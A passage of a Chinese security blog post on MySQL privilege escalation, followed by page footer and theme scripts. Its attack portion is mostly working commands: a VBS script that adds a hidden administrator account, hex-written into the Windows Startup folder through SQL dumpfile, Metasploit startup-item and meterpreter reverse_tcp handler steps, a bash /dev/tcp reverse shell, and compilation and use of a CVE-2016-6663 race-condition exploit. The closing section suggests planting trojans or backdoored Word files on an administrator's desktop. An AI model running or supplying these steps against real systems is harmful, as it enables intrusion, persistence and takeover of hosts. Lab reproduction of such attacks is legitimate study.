+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set WshShell=WScript.CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">WshShell.<span class="keyword">Run</span> <span class="string">&quot;net user hacker P@ssw0rd /add&quot;</span>, <span class="number">0</span></span><br><span class="line">WshShell.<span class="keyword">Run</span> <span class="string">&quot;net localgroup administrators hacker /add&quot;</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="MySQL-写入启动项"><a href="#MySQL-写入启动项" class="headerlink" title="MySQL 写入启动项"></a>MySQL 写入启动项</h3><p>将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select <span class="number">0</span>x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile <span class="string">&quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</p>
+<h2 id="MSF-启动项提权"><a href="#MSF-启动项提权" class="headerlink" title="MSF 启动项提权"></a>MSF 启动项提权</h2><p>没错，MSF 也封装好了对应的模块，目标系统为 Windows 的情况下可以直接使用该模块来上线 MSF，使用起来也很简单：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mysql/mysql_start_up</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; set rhosts <span class="number">10.211</span>.<span class="number">55.6</span></span><br><span class="line">msf6 &gt; set username root</span><br><span class="line">msf6 &gt; set password root</span><br><span class="line">msf6 &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347416592-91732ec0-0e55-4a32-b80f-b5e81952eb67.png"></p>
+<blockquote>
+<p>STARTUP_FOLDER 启动项文件夹得自己根据实际的目标系统来进行调整</p>
+</blockquote>
+<p>MSF 会写入 exe 木马到启动项中，执行完成后开启监听会话：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; handler -H <span class="number">10.20</span>.<span class="number">24.244</span> -P <span class="number">4444</span> -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>当目标系统重新登录的时候，MSF 这里可以看到已经成功上线了：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347417458-db6e0ee3-73bd-41c8-a309-13f28a1ba493.png"></p>
+<h2 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h2><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>国光改了基于网上的教程封装打包了一个 Docker 镜像上传到了 Docker Hub，现在大家部署就会方便许多：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull sqlsec/cve-<span class="number">2016</span>-<span class="number">6663</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker <span class="keyword">run</span> -d -p <span class="number">3306</span>:<span class="number">3306</span> -p <span class="number">8080</span>:<span class="number">80</span> --<span class="keyword">name</span> CVE-<span class="number">2016</span>-<span class="number">6663</span> sqlsec/cve-<span class="number">2016</span>-<span class="number">6663</span></span><br></pre></td></tr></table></figure>
+
+<p>添加一个 test 数据库用户，密码为 123456 并赋予一些基础权限：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; create database test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql &gt; CREATE USER <span class="comment">&#x27;test&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27;; </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql &gt; grant create,drop,insert,select <span class="keyword">on</span> test.* <span class="keyword">to</span> <span class="comment">&#x27;test&#x27;@&#x27;%&#x27;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql &gt; flush privileges;</span><br></pre></td></tr></table></figure>
+
+<p>也可以将上述操作整合成一条命令：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -e <span class="string">&quot;create database test;CREATE USER &#x27;test&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27;; grant create,drop,insert,select on test.* to &#x27;test&#x27;@&#x27;%&#x27;;flush privileges;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>竞争条件提权漏洞，一个拥有 CREATE&#x2F;INSERT&#x2F;SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限</p>
+<p><strong>利用成功条件</strong></p>
+<ol>
+<li>Getshell 拿到 www-data 权限</li>
+<li>拿到 CREATE&#x2F;INSERT&#x2F;SELECT 低权限的 MySQL 账户</li>
+<li>关键提取步骤需要在交互环境下，所以需要反弹 shell</li>
+<li>MySQL 版本需要 &lt;&#x3D;5.5.51 或 5.6.x &lt;&#x3D;5.6.32 或 5.7.x &lt;&#x3D;5.7.14 或 8.x &lt; 8.0.1</li>
+<li>MariaDB 版本需要 &lt;&#x3D; 5.5.51 或 10.0.x &lt;&#x3D; 10.0.27 或 10.1.x &lt;&#x3D; 10.1.17</li>
+</ol>
+<p>CVE-2016-6663 EXP mysql-privesc-race.c 参考链接：<a target="_blank" rel="noopener" href="https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html">MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit</a></p>
+<p>通过蚁剑上传 EXP，然后 Bash 反弹 shell：</p>
+<p>首先 10.20.24.244 端口开启监听：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ncat -lvp <span class="number">2333</span></span><br><span class="line">Ncat: Version <span class="number">7.80</span> ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening <span class="keyword">on</span> :::<span class="number">2333</span></span><br><span class="line">Ncat: Listening <span class="keyword">on</span> <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">2333</span></span><br></pre></td></tr></table></figure>
+
+<p>蚁剑终端下反弹 Bash：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.20</span>.<span class="number">24.244</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347417587-3bcdba43-ede3-4d36-afb0-18e19ee0935e.png"></p>
+<p>在反弹 shell 的情况下，首先编译 EXP：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I/<span class="keyword">usr</span>/include/mysql -lmysqlclient</span><br></pre></td></tr></table></figure>
+
+<p>执行 EXP 提权：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mysql-privesc-race test <span class="number">123456</span> localhost test</span><br></pre></td></tr></table></figure>
+
+<p>Bingo! 成功，最后的提权成功的效果如下：</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758347418704-5ce127e1-1c2b-4502-93e4-2fbf1354b8f8.png"></p>
+<p>要想获取 root 权限得配合 CVE-2016-6662 与 CVE-2016-6664 这两个漏洞，但是国光 CVE-2016-6664 漏洞复现失败了… 挖个坑，后续有机会再来总结，溜了溜了～～</p>
+<h2 id="文章总结"><a href="#文章总结" class="headerlink" title="文章总结"></a>文章总结</h2><p>现在文章思路慢慢变成了 MySQL 可操控文件怎么将这个危害扩大影响的问题了。可以往管理员桌面上写一个伪造的 CS 木马，如果对方 Office 有漏洞的话可以写入一个带后门的 word 文件，也可以篡改用户常执行的文件等 这样发散开来就变的很广了，国光这里不再一一叙述了，总之实际场景实际分析，大家在渗透的时候也可以多多思考更多的可能性，万一就成功了呢。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://book.douban.com/subject/30179595/">《网络攻防实战研究：漏洞利用与提权》</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2719">先知 - Windows 下三种 mysql 提权剖析</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7392">先知 - mysql 数据库漏洞利用及提权方式小结</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1122">先知 - Mysql 提权 (CVE-2016-6663、CVE-2016-6664 组合实践)</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/kclax/article/details/91515105?utm_medium=distribute.pc_relevant.none-task-blog-title-7&spm=1001.2101.3001.4242">CSDN: Coisini - Linux MySQL Udf 提权</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/10522972.html">博客园：sijidou - udf 提权</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/9030673.html">博客园：litlife - udf 提权原理详解</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.xazlsec.com/index.php/archives/260/">信安之路：Windows 提权系列中篇</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.webshell.cc/462.html">WebShell.cc - Mysql UDF 提权</a></li>
+<li><a target="_blank" rel="noopener" href="http://next.uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Leticia’s Blog - mysql 数据库提权总结</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/667096">阿里云开发者社区 - MySQL 日志配置</a></li>
+</ul>
+<h2 id="支持一下"><a href="#支持一下" class="headerlink" title="支持一下"></a>支持一下</h2><p>本文可能实际上也没有啥技术含量，但是写起来还是比较浪费时间的，在这个喧嚣浮躁的时代，个人博客越来越没有人看了，写博客感觉一直是用爱发电的状态。如果你恰巧财力雄厚，感觉本文对你有所帮助的话，可以考虑打赏一下本文，用以维持高昂的服务器运营费用（域名费用、服务器费用、CDN 费用等）</p>
+<p>没想到文章加入打赏列表没几天 就有热心网友打赏了 于是国光我用 Bootstrap 重写了一个页面用以感谢支持我的朋友，详情请看 <a target="_blank" rel="noopener" href="https://www.sqlsec.com/reward/">打赏列表 | 国光</a></p>
+<blockquote>
+<p>来自: <a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83">MySQL 漏洞利用与提权 | 国光</a></p>
+</blockquote>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/10/10/%E5%B0%86%E8%AF%AD%E9%9B%80%E6%96%87%E6%A1%A3%E5%86%85%E5%AE%B9%E5%90%8C%E6%AD%A5Hexo+Github/">将语雀文档内容同步Hexo+Github</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/09/18/%E6%97%A0%E9%99%90%E5%AD%A6%E4%B9%A0%E5%9B%A2%E9%98%9F%E6%9C%88%E9%9D%B6%E5%9C%BA/">无限学习团队月靶场</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<p>本站由 <a href="/">076w</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="toc-text">权限获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90"><span class="toc-text">数据库操作权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell-%E6%9D%83%E9%99%90"><span class="toc-text">Webshell 权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#into-oufile-%E5%86%99-shell"><span class="toc-text">into oufile 写 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99-shell"><span class="toc-text">日志文件写 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hash-%E8%8E%B7%E5%8F%96%E4%B8%8E%E8%A7%A3%E5%AF%86"><span class="toc-text">Hash 获取与解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-%E5%8E%86%E5%8F%B2%E4%B8%8A%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-text">MySQL 历史上的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#yaSSL-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-text">yaSSL 缓冲区溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2012-2122"><span class="toc-text">CVE-2012-2122</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF-%E6%8F%90%E6%9D%83"><span class="toc-text">UDF 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E5%A4%8D%E7%8E%B0"><span class="toc-text">手工复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-text">动态链接库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-text">寻找插件目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-text">写入动态链接库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E5%B9%B6%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">创建自定义函数并调用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-text">删除自定义函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF-shell"><span class="toc-text">UDF shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF-PHP"><span class="toc-text">UDF.PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Navicat-MySQL"><span class="toc-text">Navicat MySQL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83"><span class="toc-text">反弹端口提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MOF-%E6%8F%90%E6%9D%83"><span class="toc-text">MOF 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">手工复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-mof-%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">上传 mof 文件执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-text">痕迹清理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-MOF-%E6%8F%90%E6%9D%83"><span class="toc-text">MSF MOF 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-text">启动项提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E5%A4%8D%E7%8E%B0-2"><span class="toc-text">手工复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%B7%AF%E5%BE%84"><span class="toc-text">启动项路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E5%86%99%E5%85%A5%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-text">MySQL 写入启动项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-text">MSF 启动项提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-6663"><span class="toc-text">CVE-2016-6663</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E7%AB%A0%E6%80%BB%E7%BB%93"><span class="toc-text">文章总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%AF%E6%8C%81%E4%B8%80%E4%B8%8B"><span class="toc-text">支持一下</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
